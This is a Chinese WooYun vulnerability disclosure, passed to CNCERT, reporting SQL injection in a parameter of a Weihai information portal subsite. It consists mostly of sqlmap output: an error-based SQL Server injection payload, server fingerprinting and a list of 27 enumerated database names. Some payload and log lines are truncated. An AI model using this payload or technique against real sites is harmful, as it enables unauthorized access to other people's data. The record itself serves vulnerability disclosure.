wybug_title: 威海信息港某分站SQL注入
wybug_status: 已交由第三方合作机构(cncert国家互联网应急中心)处理
wybug_detail: 漏洞详情 披露状态：   									2015-10-06：	细节已通知厂商并且等待厂商处理中									2015-10-12：	厂商已经确认，细节仅向厂商公开									2015-10-22：	细节向核心白帽子及相关领域专家公开									2015-11-01：	细节向普通白帽子公开									2015-11-11：	细节向实习白帽子公开									2015-11-26：	细节向公众公开  简要描述：  详细说明：  http://**.**.**.**/ListLeaseHouseInfoSearch.aspx?a=1&area=a03&area2=%25u4e00%25u4e2d  area2参数存在注入sqlmap identified the following injection points with a tosts:---Place: GETParameter: area2    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - W    Payload: a=1&area=a02&area2=%u5176%u4ed6' AND 4458=CONR(120) CHAR(103) CHAR(120) CHAR(58) (SELECT (CASE WHEN (44 ELSE CHAR(48) END)) CHAR(58) CHAR(108) CHAR(113) CHAR(97)='MuZe---[00:40:29] [INFO] the back-end DBMS is Microsoft SQL Serveweb server operating system: Windows 2003web application technology: ASP.NET, Microsoft IIS 6.0, ASback-end DBMS: Microsoft SQL Server 2000[00:40:29] [INFO] fetching database names[00:40:29] [INFO] the SQL query used returns 27 entries[00:40:30] [WARNING] reflective value(s) found and filteri[00:41:05] [INFO] resumed: wh2_housenew[00:41:10] [INFO] resumed: master[00:41:10] [INFO] resumed: tempdb[00:41:10] [INFO] resumed: model[00:41:10] [INFO] resumed: msdb[00:41:10] [INFO] resumed: eweb_jiagongqu[00:41:10] [INFO] resumed: eweb_qiaotou[00:41:10] [INFO] resumed: wh2_search[00:41:10] [INFO] resumed: wh2_caijing[00:41:10] [INFO] resumed: wh2_housenew[00:41:10] [INFO] resumed: eweb_serve[00:41:10] [INFO] resumed: 3g_shop[00:41:10] [INFO] resumed: wh2_favlife[00:41:10] [INFO] resumed: eweb_gov[00:41:10] [INFO] resumed: eweb_sun[00:41:10] [INFO] resumed: NetSNS[00:41:10] [INFO] resumed: wh2_tbSMS[00:41:10] [INFO] resumed: whinfo_chat[00:41:10] [INFO] resumed: web800[00:41:10] [INFO] resumed: club_model[00:41:10] [INFO] resumed: kehuSns[00:41:10] [INFO] resumed: allMessage[00:41:10] [INFO] resumed: eweb_xiyuan[00:41:10] [INFO] resumed: eweb_jqdj[00:41:10] [INFO] resumed: eweb_jqcg[00:41:10] [INFO] resumed: eweb_rlzy[00:41:10] [INFO] resumed: wh2_caijingMobile[00:41:10] [INFO] resumed: eweb_shian[00:41:10] [INFO] resumed:available databases [27]:[*] 3g_shop[*] allMessage[*] club_model[*] eweb_gov[*] eweb_jiagongqu[*] eweb_jqcg[*] eweb_jqdj[*] eweb_qiaotou[*] eweb_rlzy[*] eweb_serve[*] eweb_shian[*] eweb_sun[*] eweb_xiyuan[*] kehuSns[*] master[*] model[*] msdb[*] NetSNS[*] tempdb[*] web800[*] wh2_caijing[*] wh2_caijingMobile[*] wh2_favlife[*] wh2_housenew[*] wh2_search[*] wh2_tbSMS[*] whinfo_chat   漏洞证明：     修复方案：     版权声明：转载请注明来源 憋屈@乌云
wybug_reply: 漏洞回应  厂商回应： 危害等级：中 漏洞Rank：8  确认时间：2015-10-12 10:48 厂商回复： CNVD确认所述情况,已经转由CNCERT下发给山东分中心,由其后续协调网站管理单位处置. 最新状态： 暂无
